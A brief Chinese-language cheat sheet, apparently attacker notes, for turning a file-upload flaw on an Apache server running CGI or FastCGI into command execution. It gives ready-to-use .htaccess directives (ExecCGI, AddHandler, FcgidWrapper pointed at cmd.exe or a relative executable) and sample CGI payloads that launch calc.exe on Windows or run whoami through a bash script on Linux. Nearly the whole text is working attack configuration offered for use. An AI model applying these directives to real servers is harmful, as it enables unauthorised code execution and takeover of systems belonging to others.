	phpinfo中搜索server api是cgi或者fastcgi
	如果是cgi模式:上传如下htaccess
	Options ExecCGI
	AddHandler cgi-script .xx
	windows平台
	#!C:/Windows/System32/cmd.exe /c start calc.exe
	1
	linux平台
	#!/bin/bash
	echo -ne "Content-Type: text:html\n\n"
	whoami
	如果是fast_cgi，上传如下htaccess
	Options +ExecCGI
	AddHandler fcgid-script .abc
	FcgidWrapper "C:/Windows/System32/cmd.exe /c start cmd.exe" .abc
	上传任意文件.abc
	相对路径
	AddHandler fcgid-script .html
	FcgidWrapper "../../php/php7.3.4nts/php-cgi.exe" .html

	AddHandler fcgid-script .xx
	FcgidWrapper "../../../WWW/localhost/calc.exe" .xx